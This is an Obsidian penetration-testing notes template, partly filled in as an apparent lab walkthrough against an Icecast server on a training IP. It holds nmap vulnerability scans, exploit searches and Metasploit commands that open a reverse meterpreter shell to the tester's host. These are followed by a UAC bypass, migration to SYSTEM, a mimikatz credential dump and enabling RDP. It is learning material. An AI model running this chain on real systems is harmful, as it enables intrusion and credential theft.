Use this template in Obsidian to register your findings per target.

---
## 🖥️ Target System: `IP/Hostname`


<summary>1. 🧭 Initial Reconnaissance</summary>

- **Tools Used**: 
- **Host Discovery**:
  - Was the host alive? Yes
  - Ping Response:

![[Pasted image 20250628130705.png]]

- **Port Scan Results**:
  - Open Ports:
  - Service Versions:
  - OS Detection:

![[port_scan 1.txt]]

![[Pasted image 20250628132104.png]]

---

<summary>2. 📂 Enumeration</summary>

- **Ports/Services Analyzed**: 
- **Tools Used**: nmap, searchsploit
	- nmap code: nmap -Pn -T5 -v3 -p- --script vuln 10.10.143.167 -o vulnerabilities_scan.txt
	
- **Findings**:
  - Directories found:
  - Enumerated users/accounts:
  - Software versions:
- **Screenshots/Proof**:

![[vulnerabilities_scan.txt]]

![[Pasted image 20250628133612.png]]

Exploit Title                                                                                                                          |  Path
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Icecast 1.1.x/1.3.x - Directory Traversal                                                                                               | multiple/remote/20972.txt
Icecast 1.1.x/1.3.x - Slash File Name Denial of Service                                                                                 | multiple/dos/20973.txt
Icecast 1.3.7/1.3.8 - 'print_client()' Format String                                                                                    | windows/remote/20582.c
Icecast 1.x - AVLLib Buffer Overflow                                                                                                    | unix/remote/21363.c
Icecast 2.0.1 (Win32) - Remote Code Execution (1)                                                                                       | windows/remote/568.c
Icecast 2.0.1 (Win32) - Remote Code Execution (2)                                                                                       | windows/remote/573.c
Icecast 2.0.1 (Windows x86) - Header Overwrite (Metasploit)                                                                             | windows_x86/remote/16763.rb
Icecast 2.x - XSL Parser Multiple Vulnerabilities                                                                                       | multiple/remote/25238.txt
icecast server 1.3.12 - Directory Traversal Information Disclosure                                                                      | linux/remote/21602.txt

---

<summary>3. 🚨 Vulnerability Analysis</summary>

- **Identified Vulnerabilities**:
  - Description: Icecast
  - CVE/Exploit DB Ref: CVE-2004-1561
- **Tool(s) Used**: [CVEdetails.com](https://www.cvedetails.com/ "Go to cvedetails.com homepage")

- **Proof/Output**:

![[Pasted image 20250628134033.png]]

---


<summary>4. 💣 Exploitation</summary>

- **Tool(s) Used**: metasploit
- **Exploit/Payload**:
  - Command: 

	search icecast

![[Pasted image 20250628134150.png]]

	use 0
	options
	set rhosts 10.10.143.167
	set lhost 10.14.102.108
	run

- **Result**:
  - Got Shell? User Access?
		  - Got meterpreter session
		  - User: Dark - getuid
		  - Build: 7601 - sysinfo

use `run post/multi/recon/local_exploit_suggester` in meterpreter to see best exploit to use in the machine.

(Meterpreter 2)(C:\Program Files (x86)\Icecast2 Win32) > run post/multi/recon/local_exploit_suggester
[*] 10.10.143.167 - Collecting local exploits for x86/windows...
[*] 10.10.143.167 - 205 exploit checks are being tried...
[+] 10.10.143.167 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.143.167 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.143.167 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.10.143.167 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.143.167 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.143.167 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.143.167 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.143.167 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.143.167 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.143.167 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[+] 10.10.143.167 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 42 / 42
[*] 10.10.143.167 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 4   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 5   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 10  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 11  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.

use Ctrl + Z to exit the session

use explot 2 - success

use getprivs  - to see "Enabled Process Privileges"

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
==SeTakeOwnershipPrivilege==
SeTimeZonePrivilege
SeUndockPrivilege


- **Post-Exploitation Notes**:
  - E.g., accessed user.txt
- **Proof**: 
  - ![[proof-shell.png]]
---

<summary>5. 🪜 Privilege Escalation</summary>

- **Initial Access Level**:
- **Techniques Tried**:
  - metasploit, migrate,  mimikatz, 
- **Success Path**:
  - Commands used:
- **Root Access?** (Yes/No)
- **Proof**:

as we can get ownership priviliges from running processes `SeTakeOwnershipPrivilege`

use `ps`to see running processes.

![[Pasted image 20250628140911.png]]

Migrate to this process now with the command `migrate -N PROCESS_NAME`

`migrate 1372`

`getuid`

user: NT AUTHORITY\SYSTEM

Use mimikatz - `load kiwi`

Now mimikatz is loaded into this session

![[Pasted image 20250628141514.png]]

use `creda_all` to retrieve all passwords

![[Pasted image 20250628141648.png]]

to enabel rdp

run post/windows/manage/enable_rdp - outside a meterpreter 

---

<summary>6. 🗃️ Post-Exploitation</summary>

- **Files/Flags Accessed**:
- **Sensitive Data Found**:
  - Passwords, config files:
- **Users Compromised**:
- **Persistence (if tested)**:

---

<summary>7. 📓 Lessons Learned</summary>

- **What Worked**: mimikatz, metasploit, 
- **What Didn’t**:
- **To Improve**:

---

<summary>8. 📎 Appendix</summary>

- Screenshot Links:
  - ![[example.png]]
- Full Command Logs:
  - Use code blocks for clarity:
    ```bash
    command here
    output here
    ```
- Exploit Code Used:
  ```python
  # Sample exploit
